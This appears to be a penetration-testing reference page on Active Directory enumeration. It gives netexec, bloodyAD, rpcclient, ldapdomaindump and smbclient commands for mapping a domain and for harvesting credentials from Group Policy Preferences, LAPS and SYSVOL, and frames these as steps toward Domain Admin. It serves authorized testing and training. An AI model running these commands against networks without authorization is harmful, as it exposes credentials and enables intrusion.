---
title: "Enumeration"
---

# 🔎 Enumeration

> _First phase against an Active Directory environment: map the attack surface from unauthenticated scans to authenticated SAMR/LDAP enum, then graph relationships with BloodHound to find the shortest path to Domain Admin._

## 📚 Resources

- [TheHackerRecipes - Recon](https://www.thehacker.recipes/ad/recon)
- [ADRecon](https://github.com/sense-of-security/ADRecon) - PowerShell AD audit script, produces an Excel report
- [PingCastle](https://www.pingcastle.com/) - audit tool, scores a domain in minutes
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) - full LDAP dump to HTML/JSON

## 🧭 Workflow at a glance

1. **Unauth probe** - what's exposed without creds (null sessions, DNS, anonymous LDAP).
2. **Context grab** - domain name, DC hostname, naming context, forest trust - needed by every tool after this.
3. **Authed enum** - SAMR/LDAP sweep with any valid creds (users, groups, computers, GPOs, ACLs, policies).
4. **Graph it** - BloodHound ingestion to find attack paths.

## 🛠️ Basic recon

::: code-group

```bash [enum4linux]
# Unauthenticated sweep (null session, SMB/RPC/LDAP shotgun)
enum4linux-ng -a $DC_IP

# Authenticated run (richer output: users, groups, policy)
enum4linux-ng -A -u "$DOMAIN/$USER" -p "$PASSWORD" $DC_HOST
```

```bash [nbtscan]
nbtscan -r $DC_HOST                                # NetBIOS names on a subnet
```

:::

## 🌐 DNS

> _AD leaks everything through DNS: SRV records give you the DC, the forest root, the Kerberos service. A zone transfer (AXFR) or an authenticated dump often prints half the domain._

::: code-group

```bash [SRV records]
# Find the DC(s) without touching the host
dig +short _ldap._tcp.dc._msdcs.$DOMAIN SRV
dig +short _kerberos._tcp.$DOMAIN SRV
dig +short _gc._tcp.$DOMAIN SRV                    # global catalog
```

```bash [bloodyAD]
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get dnsDump
```

```bash [nxc]
netexec smb $DC_IP -u $USER -p $PASSWORD -d $DOMAIN -M enum_dns
```

```bash [adidnsdump]
# Dump all DNS zones stored in AD (needs any domain user)
adidnsdump -u "$DOMAIN\\$USER" -p "$PASSWORD" $DC_IP
```

:::

## 🏷️ Domain context

> _Grab these first - every later tool wants `-d $DOMAIN -dc-ip $DC_IP` or the naming context._

```bash
# Root DSE - works unauthenticated on most DCs
ldapsearch -LLL -x -H ldap://$DC_IP -s base -b '' '(objectClass=*)' \
  defaultNamingContext rootDomainNamingContext dnsHostName

# netexec one-liner (also prints OS, signing, SMBv1 status)
nxc smb $DC_IP
nxc ldap $DC_IP -u $USER -p $PASSWORD              # also prints forest/domain functional level
```

## 🔐 Password policy

> _Needed before any password spray - lock out = burned account._

::: code-group

```bash [nxc]
nxc smb $DC_IP -u $USER -p $PASSWORD --pass-pol
```

```bash [rpcclient]
rpcclient -U "$DOMAIN\\$USER%$PASSWORD" $DC_IP -c "getdompwinfo"
rpcclient -U "" -N $DC_IP -c "getdompwinfo"        # legacy null-session shot
```

```bash [PSO]
# Fine-grained password policies override the default for specific groups
nxc ldap $DC_IP -u $USER -p $PASSWORD -M pso
```

:::

## 💻 Computers, LAPS, delegation

::: code-group

```bash [computers]
nxc ldap $DC_IP -u $USER -p $PASSWORD --computers
ldapdomaindump -u "$DOMAIN\\$USER" -p "$PASSWORD" $DC_IP -o ./ldd    # writes HTML/JSON/grep files
```

```bash [LAPS]
# Who can read LAPS passwords (= local admin on those machines)
nxc ldap $DC_IP -u $USER -p $PASSWORD -M laps
```

```bash [delegation]
# Unconstrained / constrained / RBCD candidates
nxc ldap $DC_IP -u $USER -p $PASSWORD --trusted-for-delegation
```

:::

## 🤝 Trusts

> _Cross-domain trusts open lateral paths. SID history + "foreign security principal" ACLs are frequent escalation routes._

```bash
nxc ldap $DC_IP -u $USER -p $PASSWORD -M enum_trusts
bloodyAD --host $DC_IP -d $DOMAIN -u $USER -p $PASSWORD get trusts
```

## 📜 GPO & shares

```bash
# GPOs - look for policies pushing creds, scheduled tasks, autologon
nxc smb $DC_IP -u $USER -p $PASSWORD -M gpp_password     # Group Policy Preferences cpassword
nxc smb $DC_IP -u $USER -p $PASSWORD -M gpp_autologin

# SYSVOL / NETLOGON scripts often hold passwords and scheduled task configs
smbclient.py $DOMAIN/$USER:$PASSWORD@$DC_IP
# > use SYSVOL
# > recurse ON ; prompt OFF ; mget *
```

## 🧭 Next steps

- [Users enumeration](./users.md) - kerbrute, rpcclient, impacket (user discovery + validation, spray-safe wordlists)
- [BloodHound](./bloodhound.md) - ingest + graph the domain, hunt attack paths
- [MS-RPC](/network/services-pentesting/135-msrpc.md) - RPC-level primitives (SAMR, LSARPC, coercion)
- [LDAP](/network/services-pentesting/389-636-ldap.md) - deep LDAP query reference
